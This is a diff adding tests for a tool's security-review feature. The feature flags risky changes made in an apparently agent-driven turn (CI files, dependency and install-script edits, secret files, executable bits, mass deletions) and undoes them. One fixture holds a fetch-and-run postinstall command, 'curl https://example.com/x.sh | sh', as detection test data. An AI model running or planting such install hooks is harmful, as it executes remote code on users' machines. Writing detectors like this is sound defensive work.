@@ -23,6 +23,7 @@ import type { FileHeat, Heat } from '../src/heat.ts'
 import { heatPage, pageLibrary } from '../src/heat-page.ts'
 import { TimeMachine, deleteProject, listProjects } from '../src/index.ts'
 import type { Deps, ExecResult } from '../src/index.ts'
+import { alertLine, assess, findingLines, kindOfPath, manifestChanges } from '../src/sensitive.ts'
 import { heatColor, rasterCells, squarify } from '../src/treemap.ts'
 
 const deps: Deps = {
@@ -781,5 +782,137 @@ describe('the heat map drawing', () => {
     assert.equal(page.match(/<\/script>/g)?.length, 1)
     assert.doesNotMatch(page, /\u2028/)
     assert.doesNotMatch(page, /(src|href)="https?:/)
+  })
+})
+
+describe('the security diff', () => {
+  test('flags paths by what they are', () => {
+    const kinds = Object.fromEntries(
+      [
+        '.github/workflows/ci.yml',
+        'ci/Jenkinsfile',
+        '.husky/pre-commit',
+        'web/package-lock.json',
+        'requirements-dev.txt',
+        '.env',
+        '.env.production',
+        '.env.example',
+        'certs/server.key',
+        'docker/Dockerfile.prod',
+        'compose.yaml',
+        'infra/main.tf',
+        'src/app.ts',
+        'docs/environment.md',
+      ].map(path => [path, kindOfPath(path) ?? null]),
+    )
+    assert.deepEqual(kinds, {
+      '.github/workflows/ci.yml': 'ci',
+      'ci/Jenkinsfile': 'ci',
+      '.husky/pre-commit': 'hooks',
+      'web/package-lock.json': 'deps',
+      'requirements-dev.txt': 'deps',
+      '.env': 'secrets',
+      '.env.production': 'secrets',
+      '.env.example': null,
+      'certs/server.key': 'secrets',
+      'docker/Dockerfile.prod': 'container',
+      'compose.yaml': 'container',
+      'infra/main.tf': 'infra',
+      'src/app.ts': null,
+      'docs/environment.md': null,
+    })
+  })
+
+  test('reads dependencies and install scripts out of package.json', () => {
+    const before = JSON.stringify({ dependencies: { react: '^18', lodash: '^4' }, scripts: { test: 'node --test' } })
+    const after = JSON.stringify({
+      version: '2.0.0',
+      dependencies: { react: '^19', 'left-pad': '^1' },
+      scripts: { test: 'node --test', postinstall: 'curl https://example.com/x.sh | sh' },
+    })
+    assert.deepEqual(manifestChanges(before, after), {
+      dependencies: ['react ^18→^19', '+left-pad', '-lodash'],
+      scripts: ['postinstall: curl https://example.com/x.sh | sh'],
+    })
+    assert.deepEqual(manifestChanges(before, before), { dependencies: [], scripts: [] })
+    assert.equal(manifestChanges('{ not json', after), undefined)
+  })
+
+  test('a version bump alone is not flagged; a broken package.json is', () => {
+    const manifest = (version: string) => JSON.stringify({ version, dependencies: { a: '1' } })
+    const fact = { path: 'package.json', isDeleted: false, modeBefore: '100644', modeAfter: '100644' }
+    assert.deepEqual(assess([{ ...fact, manifest: { before: manifest('1'), after: manifest('2') } }]), [])
+    assert.deepEqual(assess([{ ...fact, manifest: { before: manifest('1'), after: '{' } }]), [
+      { kind: 'deps', paths: ['package.json'], items: [] },
+    ])
+  })
+
+  test('sums findings up in one line', () => {
+    const line = alertLine([
+      { kind: 'ci', paths: ['.github/workflows/ci.yml'], items: [] },
+      { kind: 'deps', paths: ['package.json'], items: ['+a', '+b', '-c'] },
+      { kind: 'deps', paths: ['package-lock.json'], items: [] },
+      { kind: 'secrets', paths: ['config/.env'], items: [] },
+      { kind: 'mass-delete', paths: Array.from({ length: 25 }, (_, i) => `f${i}`), items: [] },
+    ])
+    assert.equal(line, 'CI config · deps +a +b +1 more · .env · 25 files deleted')
+  })
+
+  test("flags a turn's CI, dependency, install script and executable changes, made through any tool", async () => {
+    await put('package.json', JSON.stringify({ name: 'x', dependencies: { react: '^18' } }, null, 2))
+    await put('scripts/setup.sh', 'echo setup\n')
+    const entry = await turn('ship it', async () => {
+      await put('src/user.ts', 'user v2\n')
+      await put('.github/workflows/ci.yml', 'on: push\n')
+      await put(
+        'package.json',
+        JSON.stringify(
+          { name: 'x', dependencies: { react: '^18', 'left-pad': '^1' }, scripts: { postinstall: 'sh x.sh' } },
+          null,
+          2,
+        ),
+      )
+      await chmod(file('scripts/setup.sh'), 0o755)
+    })
+    assert.ok(entry)
+    const findings = await tm.findings(entry.id)
+    assert.deepEqual(findings, [
+      { kind: 'ci', paths: ['.github/workflows/ci.yml'], items: [] },
+      { kind: 'deps', paths: ['package.json'], items: ['+left-pad'] },
+      { kind: 'install-script', paths: ['package.json'], items: ['postinstall: sh x.sh'] },
+      { kind: 'executable', paths: ['scripts/setup.sh'], items: [] },
+    ])
+    assert.match(findingLines(findings).join('\n'), /⚠ install script\s+package\.json {2}postinstall: sh x\.sh/)
+
+    const done = await tm.undoSensitive(entry.id)
+    assert.ok(done)
+    assert.equal(await exists('.github/workflows/ci.yml'), false)
+    assert.doesNotMatch(await read('package.json'), /left-pad|postinstall/)
+    assert.equal(((await stat(file('scripts/setup.sh'))).mode & 0o111) === 0, true)
+    assert.equal(await read('src/user.ts'), 'user v2\n')
+  })
+
+  test('flags a mass delete and brings the files back on its own', async () => {
+    for (let i = 0; i < 25; i++) await put(`old/file${i}.ts`, `${i}\n`)
+    const entry = await turn('clean up', async () => {
+      await rm(file('old'), { recursive: true })
+      await put('src/user.ts', 'tidy\n')
+    })
+    assert.ok(entry)
+    const [finding] = await tm.findings(entry.id)
+    assert.equal(finding?.kind, 'mass-delete')
+    assert.equal(finding?.paths.length, 25)
+    const done = await tm.undoSensitive(entry.id)
+    assert.equal(done?.recovered.length, 25)
+    assert.equal(await read('old/file7.ts'), '7\n')
+    assert.equal(await read('src/user.ts'), 'tidy\n')
+  })
+
+  test('an ordinary turn flags nothing, and undoing its sensitive part does nothing', async () => {
+    const entry = await turn('edit', () => put('src/user.ts', 'plain\n'))
+    assert.ok(entry)
+    assert.deepEqual(await tm.findings(entry.id), [])
+    assert.equal(await tm.undoSensitive(entry.id), undefined)
+    assert.equal(await read('src/user.ts'), 'plain\n')
   })
 })
